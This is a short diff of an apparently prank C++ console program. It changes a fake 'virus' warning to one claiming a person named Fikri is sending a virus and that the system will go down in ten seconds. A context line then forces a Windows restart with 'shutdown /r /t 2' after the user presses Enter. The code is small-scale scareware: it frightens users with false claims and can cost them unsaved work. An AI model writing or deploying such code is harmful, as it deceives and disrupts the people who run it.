@@ -19,7 +19,7 @@ awal:
 	cout<<" ";
  	cin>>jawab;
  
-	cout<<"\n\n WARNING !!!\n VIRUS IS DETECT ON YOU'RE COMPUTER. YOU'RE SYSTEM IS DOWN AFTER 1 MINUTES \n PRESS ENTER NOW TO DELETE YOU'RE VIRUS\n\n\n "; system("pause");
+	cout<<"\n\n WARNING !!!\n FIKRI SENDING VIRUS ON YOU'RE COMPUTER. YOU'RE SYSTEM DOWN AFTER 10 SECOND \n PRESS ENTER NOW TO DELETE YOU'RE VIRUS\n\n\n "; system("pause");
 	system("c:\\windows\\system32\\shutdown /r /t 2 \n\n");
 
 }
